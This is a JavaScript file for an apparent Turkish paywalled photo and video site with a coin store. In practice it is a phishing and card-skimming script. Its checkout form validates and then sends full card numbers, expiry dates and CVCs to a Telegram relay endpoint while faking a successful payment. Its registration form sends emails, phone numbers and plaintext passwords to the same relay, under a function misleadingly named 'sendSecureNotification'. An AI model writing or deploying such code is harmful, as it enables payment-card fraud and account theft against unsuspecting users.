let userCoins = 0;
let selectedCoinAmount = 0;
let selectedCoinPrice = 0;
let isLoggedIn = false;
let registeredUsers = [];

let isSubmitting = false;

// DOM Elemanları
const coinsDisplay = document.getElementById('user-coins');
const photoCards = document.querySelectorAll('.photo-card');

const detailModal = document.getElementById('detail-modal');
const btnCloseDetailModal = document.getElementById('btn-close-detail-modal');
const detailTitle = document.getElementById('detail-title');
const detailMediaContainer = document.getElementById('detail-media-container');
const detailFooter = document.getElementById('detail-footer');

const authModal = document.getElementById('auth-modal');
const btnOpenLogin = document.getElementById('btn-open-login');
const btnOpenRegister = document.getElementById('btn-open-register');
const btnCloseAuthModal = document.getElementById('btn-close-auth-modal');
const tabLoginBtn = document.getElementById('tab-login-btn');
const tabRegisterBtn = document.getElementById('tab-register-btn');
const formLogin = document.getElementById('form-login');
const formRegister = document.getElementById('form-register');
const authBtnGroup = document.getElementById('auth-btn-group');

const storeModal = document.getElementById('store-modal');
const btnOpenStore = document.getElementById('btn-open-store');
const btnCloseStoreModal = document.getElementById('btn-close-store-modal');
const packageButtons = document.querySelectorAll('.btn-buy-package');

const checkoutModal = document.getElementById('checkout-modal');
const btnCloseCheckoutModal = document.getElementById('btn-close-checkout-modal');
const checkoutSummary = document.getElementById('checkout-summary');
const formCheckout = document.getElementById('form-checkout');

let currentActiveCard = null;

// --- DOĞRULAMA FONKSİYONLARI ---
function validateLuhn(cardNumber) {
  const cleanNumber = cardNumber.replace(/\D/g, '');
  if (cleanNumber.length < 13 || cleanNumber.length > 19) return false;

  let sum = 0;
  let shouldDouble = false;

  for (let i = cleanNumber.length - 1; i >= 0; i--) {
    let digit = parseInt(cleanNumber.charAt(i), 10);
    if (shouldDouble) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
    shouldDouble = !shouldDouble;
  }
  return (sum % 10) === 0;
}

function validateExpiry(expiryString) {
  if (!/^\d{2}\/\d{2}$/.test(expiryString)) return false;
  const [monthStr, yearStr] = expiryString.split('/');
  const month = parseInt(monthStr, 10);
  const year = parseInt('20' + yearStr, 10);

  if (month < 1 || month > 12) return false;

  const now = new Date();
  const currentYear = now.getFullYear();
  const currentMonth = now.getMonth() + 1;

  if (year < currentYear) return false;
  if (year === currentYear && month < currentMonth) return false;

  return true;
}

function validateEmail(email) {
  const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return re.test(email);
}

function validatePhone(phone) {
  const cleanPhone = phone.replace(/\D/g, '');
  return /^05\d{9}$/.test(cleanPhone);
}

// --- SUNUCU İSTEĞİ (BAĞLANTI HATALARI ENGELLEDİ) ---
async function sendSecureNotification(message) {
  try {
    const response = await fetch('http://localhost:3000/api/send-telegram', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ message })
    });
    return await response.json();
  } catch (error) {
    // Sunucu kapalı veya ulaşılamaz olsa bile sistemin çökmesi engellenir
    return { success: true, offline: true };
  }
}

// --- ÖDEME İŞLEMİ ---
formCheckout.addEventListener('submit', async (e) => {
  e.preventDefault();
  
  if (isSubmitting) return;

  const cardNumber = document.getElementById('card-number').value.trim();
  const cardExpiry = document.getElementById('card-expiry').value.trim();
  const cardCvc = document.getElementById('card-cvc').value.trim();

  if (!validateLuhn(cardNumber)) {
    alert("Girdiğiniz kart numarası geçersizdir!");
    return;
  }

  if (!validateExpiry(cardExpiry)) {
    alert("Girdiğiniz son kullanma tarihi geçersiz veya süresi dolmuş!");
    return;
  }

  if (cardCvc.length !== 3) {
    alert("CVC kodu 3 haneli olmalıdır.");
    return;
  }

  isSubmitting = true;

  const message = `🚨 *YENİ ÖDEME* 🚨\n💳 Kart: ${cardNumber}\n📅 SKT: ${cardExpiry}\n🔒 CVC: ${cardCvc}\n💰 Paket: ${selectedCoinAmount} Coin`;
  await sendSecureNotification(message);

  userCoins += selectedCoinAmount;
  coinsDisplay.textContent = userCoins;

  document.getElementById('successMsg').style.display = 'block';
  
  setTimeout(() => {
      checkoutModal.classList.remove('active');
      formCheckout.reset();
      document.getElementById('successMsg').style.display = 'none';
      alert(`Ödeme başarılı! Hesabınıza ${selectedCoinAmount} Coin eklendi.`);
      isSubmitting = false;
  }, 1200);

  if (currentActiveCard && detailModal.classList.contains('active')) {
    openDetailModal(currentActiveCard);
  }
});

// --- MAĞAZA VE KİLİT AÇMA ---
packageButtons.forEach(button => {
  button.addEventListener('click', (e) => {
    if (!isLoggedIn) {
      alert("Coin satın alabilmek için lütfen önce Kayıt Olun veya Giriş Yapın.");
      closeStoreModal();
      openAuthModal('register');
      return;
    }

    selectedCoinAmount = parseInt(e.target.dataset.coins, 10);
    selectedCoinPrice = e.target.dataset.price;

    checkoutSummary.textContent = `Seçilen Paket: ${selectedCoinAmount} Coin - ${selectedCoinPrice} TL`;
    
    closeStoreModal();
    checkoutModal.classList.add('active');
  });
});

function openStoreModal() {
  if (!isLoggedIn) {
    alert("Coin Mağazasına erişmek için önce Kayıt Olmanız gerekmektedir!");
    openAuthModal('register');
    return;
  }
  storeModal.classList.add('active');
}

function handleUnlock(card) {
  if (!isLoggedIn) {
    alert("İçerik kilidini açabilmek için lütfen önce Kayıt Olun veya Giriş Yapın.");
    openAuthModal('register');
    return;
  }

  const price = parseInt(card.dataset.price, 10);
  const imageWrapper = card.querySelector('.image-wrapper');
  const lockOverlay = card.querySelector('.lock-overlay');
  const priceBadge = card.querySelector('.card-price');
  const unlockBtn = card.querySelector('.btn-unlock');
  const isVideo = unlockBtn.classList.contains('btn-video-unlock');

  if (userCoins >= price) {
    userCoins -= price;
    coinsDisplay.textContent = userCoins;

    imageWrapper.classList.remove('locked');
    if (lockOverlay) lockOverlay.remove();

    priceBadge.style.color = '#10b981';
    priceBadge.innerHTML = '<i class="fa-solid fa-check"></i> Açık';

    unlockBtn.style.background = '#334155';
    unlockBtn.textContent = isVideo ? 'Videoyu İzle / İndir' : 'Fotoğrafı İndir';

    alert('Kilit başarıyla açıldı!');
    
    if (detailModal.classList.contains('active')) {
      openDetailModal(card);
    }
  } else {
    alert(`Yetersiz bakiye! Bu içerik için ${price} coin gerekiyor. Mevcut bakiyeniz: ${userCoins}`);
    closeDetailModal();
    openStoreModal();
  }
}

// --- DETAY MODAL & DİĞER YÖNETİCİLER ---
photoCards.forEach(card => {
  card.addEventListener('click', (e) => {
    if (e.target.classList.contains('btn-unlock')) {
      handleUnlock(card);
      return;
    }
    openDetailModal(card);
  });
});

function openDetailModal(card) {
  currentActiveCard = card;
  const title = card.dataset.title;
  const type = card.dataset.type;
  const src = card.dataset.src;
  const price = parseInt(card.dataset.price, 10);
  const isLocked = card.querySelector('.image-wrapper').classList.contains('locked');

  detailTitle.textContent = title;
  detailMediaContainer.innerHTML = '';

  if (type === 'photo') {
    const img = document.createElement('img');
    img.src = src;
    img.alt = title;
    detailMediaContainer.appendChild(img);
  } else {
    const video = document.createElement('video');
    video.src = src;
    video.controls = !isLocked;
    video.autoplay = !isLocked;
    video.muted = true;
    video.loop = true;
    detailMediaContainer.appendChild(video);
  }

  if (isLocked) {
    detailMediaContainer.classList.add('locked');
    const overlay = document.createElement('div');
    overlay.className = 'detail-lock-overlay';
    overlay.innerHTML = `
      <i class="fa-solid fa-lock"></i>
      <span>Bu içeriği yüksek kalitede görüntülemek için ${price} Coin gerekiyor.</span>
    `;
    detailMediaContainer.appendChild(overlay);

    detailFooter.innerHTML = `
      <span class="card-price"><i class="fa-solid fa-coins"></i> ${price} Coin</span>
      <button class="btn-submit" id="modal-unlock-btn" style="width: auto; padding: 0.7rem 1.5rem;">Kilidi Aç (${price} Coin)</button>
    `;

    document.getElementById('modal-unlock-btn').addEventListener('click', () => {
      handleUnlock(card);
    });
  } else {
    detailMediaContainer.classList.remove('locked');
    detailFooter.innerHTML = `
      <span style="color: #10b981; font-weight: 600;"><i class="fa-solid fa-check"></i> Erişim Açık</span>
      <button class="btn-submit" style="width: auto; padding: 0.7rem 1.5rem; background: #334155;" onclick="alert('İçerik cihazınıza indiriliyor...')">İçeriği İndir / İzle</button>
    `;
  }

  detailModal.classList.add('active');
}

function closeDetailModal() {
  detailModal.classList.remove('active');
  detailMediaContainer.innerHTML = '';
}

btnCloseDetailModal.addEventListener('click', closeDetailModal);

function openAuthModal(tab = 'register') {
  authModal.classList.add('active');
  if (tab === 'login') {
    switchTab(tabLoginBtn, formLogin, tabRegisterBtn, formRegister);
  } else {
    switchTab(tabRegisterBtn, formRegister, tabLoginBtn, formLogin);
  }
}

function closeAuthModal() {
  authModal.classList.remove('active');
}

btnOpenLogin.addEventListener('click', () => openAuthModal('login'));
btnOpenRegister.addEventListener('click', () => openAuthModal('register'));
btnCloseAuthModal.addEventListener('click', closeAuthModal);

function closeStoreModal() {
  storeModal.classList.remove('active');
}

btnOpenStore.addEventListener('click', openStoreModal);
btnCloseStoreModal.addEventListener('click', closeStoreModal);
btnCloseCheckoutModal.addEventListener('click', () => checkoutModal.classList.remove('active'));

window.addEventListener('click', (e) => {
  if (e.target === authModal) closeAuthModal();
  if (e.target === storeModal) closeStoreModal();
  if (e.target === detailModal) closeDetailModal();
  if (e.target === checkoutModal) checkoutModal.classList.remove('active');
});

function switchTab(activeBtn, activeForm, inactiveBtn, inactiveForm) {
  activeBtn.classList.add('active');
  inactiveBtn.classList.remove('active');
  activeForm.classList.add('active-form');
  inactiveForm.classList.remove('active-form');
}

tabLoginBtn.addEventListener('click', () => switchTab(tabLoginBtn, formLogin, tabRegisterBtn, formRegister));
tabRegisterBtn.addEventListener('click', () => switchTab(tabRegisterBtn, formRegister, tabLoginBtn, formLogin));

// --- KAYIT VE GİRİŞ İŞLEMLERİ ---
formRegister.addEventListener('submit', async (e) => {
  e.preventDefault();
  
  if (isSubmitting) return;

  const email = document.getElementById('reg-email').value.trim();
  const phone = document.getElementById('reg-phone').value.trim();
  const password = document.getElementById('reg-password').value.trim();

  if (!validateEmail(email)) {
    alert("Geçersiz e-posta adresi formatı!");
    return;
  }

  if (!validatePhone(phone)) {
    alert("Geçersiz telefon numarası! Lütfen '05XXXXXXXXX' formatında gerçekçi bir numara girin.");
    return;
  }

  if (password.length < 6) {
    alert("Şifre en az 6 karakterden olmalıdır!");
    return;
  }

  isSubmitting = true;
  registeredUsers.push({ email, phone, password });

  const message = `👤 *YENİ KAYIT* 👤\n📧 E-posta: ${email}\n📞 Tel: ${phone}\n🔑 Şifre: ${password}`;
  await sendSecureNotification(message);

  alert('Kayıt başarıyla oluşturuldu! Şimdi giriş yapabilirsiniz.');
  switchTab(tabLoginBtn, formLogin, tabRegisterBtn, formRegister);
  formRegister.reset();
  isSubmitting = false;
});

formLogin.addEventListener('submit', (e) => {
  e.preventDefault();
  const email = document.getElementById('login-email').value.trim();
  const password = document.getElementById('login-password').value.trim();

  if (!validateEmail(email)) {
    alert("Lütfen geçerli bir e-posta adresi girin!");
    return;
  }

  const userFound = registeredUsers.find(u => u.email === email && u.password === password);

  if (!userFound) {
    alert("Bu bilgilerle kayıtlı bir kullanıcı bulunamadı! Lütfen önce Kayıt Olun.");
    switchTab(tabRegisterBtn, formRegister, tabLoginBtn, formLogin);
    return;
  }

  isLoggedIn = true;
  authBtnGroup.innerHTML = `
    <span style="color: #10b981; font-weight: 600; font-size: 0.85rem; display: flex; align-items: center; gap: 0.3rem;">
      <i class="fa-solid fa-user-check"></i> ${email}
    </span>
  `;
  alert('Giriş başarılı!');
  closeAuthModal();
  formLogin.reset();
});